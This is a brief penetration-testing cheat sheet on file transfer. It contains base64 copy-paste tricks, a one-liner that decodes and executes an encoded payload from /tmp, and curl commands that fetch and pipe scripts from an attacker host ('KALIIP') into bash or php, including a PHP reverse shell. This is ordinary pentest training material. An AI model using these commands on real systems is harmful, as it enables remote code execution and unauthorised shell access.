# Transferring Files

This section could easily be put in the post-exploitation section. But I consider this knowledge so fundamental that I chose to put it here.

## Giant file transfer, can't transfer over network \(Base64\)

```
base64 file
highlight beginning, hit enter to copy to bottom, ctrl+c, paste
base64 -d pastedfile
md5sum both to ensure accurate completion
```

# Can also be used for encoding/decoding issues and file execution

**XML as example:**

We could base64 encode the user supplied command \(since base64 characters don't break XML\) and decode that on the command line into a file, then execute that file with /bin/bash and then remove that temporary file all while avoiding special XML characters. For example, the following one-line command could achieve this:

```

echo L3Vzci9iaW4vd2hvYW1pIA==| base64 -d | tee -a /tmp/payload.tmp ; /bin/bash /tmp/payload.tmp; /bin/rm /tmp/ payload.tmp
```

# Quick file transfer & execute scripts

```
on attack
python -m SimpleHTTPServer 8080

on target
curl KALIIP:8080/LinEnum.sh | bash
LinEnum as example
```

```
Quick shell

on target
curl http://KALIIP/php-reverse-shell.php | php
```

### **References:**

[https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code)



